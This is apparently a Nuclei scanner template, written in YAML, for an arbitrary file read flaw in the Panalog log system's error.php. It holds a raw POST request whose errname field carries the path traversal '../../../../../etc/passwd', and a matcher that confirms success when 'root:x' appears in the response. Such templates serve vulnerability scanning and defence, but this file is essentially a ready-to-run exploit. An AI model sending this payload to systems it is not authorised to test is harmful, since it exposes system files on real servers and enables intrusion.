id: panalog-fileRead
info:
  author: Str1am
  name: "Panalog\u65E5\u5FD7\u7CFB\u7EDFerror.php\u6587\u4EF6\u4EFB\u610F\u6587\u4EF6\
    \u8BFB\u53D6"
  severity: medium
  tags: panalog,fileRead
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - root:x
  matchers-condition: and
  raw:
  - 'POST /error.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101
    Firefox/92.0


    errname=../../../../../etc/passwd

    '
